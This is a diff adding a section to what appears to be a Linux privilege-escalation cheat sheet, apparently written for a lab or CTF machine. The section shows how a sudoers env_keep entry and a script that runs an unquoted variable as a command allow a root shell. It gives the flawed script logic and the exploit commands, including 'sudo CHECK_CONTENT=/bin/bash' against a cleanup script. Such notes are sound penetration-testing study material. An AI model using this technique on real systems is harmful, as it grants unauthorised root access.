@@ -682,6 +682,39 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 * Errors: Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again.
 * Did it work? If not, try to figure out why not, and how the library\_path.c code could be changed to make it work.
 
+#### Sudo script: env_keep and unquoted `[ -z $VAR ]` (e.g. CHECK_CONTENT)
+
+If a sudoers entry has `env_keep+=CHECK_CONTENT` (or similar) and the allowed script uses **unquoted** `$VAR` in a test and later runs `$VAR` as a command, you can set that variable to a shell.
+
+**Example script logic:**
+
+```bash
+if [ -z $CHECK_CONTENT ]; then
+  CHECK_CONTENT=false
+fi
+# ... later, when moving a symlink to quarantine:
+if $CHECK_CONTENT; then
+  /usr/bin/echo "Content:"
+  /usr/bin/cat $QUAR_DIR/$LINK_NAME
+fi
+```
+
+* **`-z $CHECK_CONTENT`** — In bash, `-z` tests "string length zero". So when `CHECK_CONTENT` is unset or empty, the script sets `CHECK_CONTENT=false`. The variable is **unquoted** (`$CHECK_CONTENT` not `"$CHECK_CONTENT"`), which is required for this class of bug.
+* Because `env_keep+=CHECK_CONTENT` is in sudoers, your environment value is passed into the script. Set `CHECK_CONTENT=/bin/bash` (or `/bin/sh`). Then:
+  1. `[ -z $CHECK_CONTENT ]` is false (variable is set), so the script does not overwrite it.
+  2. When the script runs `if $CHECK_CONTENT;then`, it **executes** the value of `CHECK_CONTENT` as a command, i.e. runs `/bin/bash` as root.
+
+**Exploitation:**
+
+```bash
+# Create a symlink that passes the script's checks (e.g. not matching etc|root), with .png extension
+ln -s /path/to/harmless /tmp/x.png
+sudo CHECK_CONTENT=/bin/bash /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/x.png
+# Root shell
+```
+
+The script must take a path that gets moved to quarantine and then hit the `if $CHECK_CONTENT;then` branch. The symlink target must not match any blocklist (e.g. `etc|root`) in the script so the link is moved rather than unlinked.
+
 #### Sudo -l LD\_PRELOAD Method 2
 
 1. In command prompt type: sudo -l
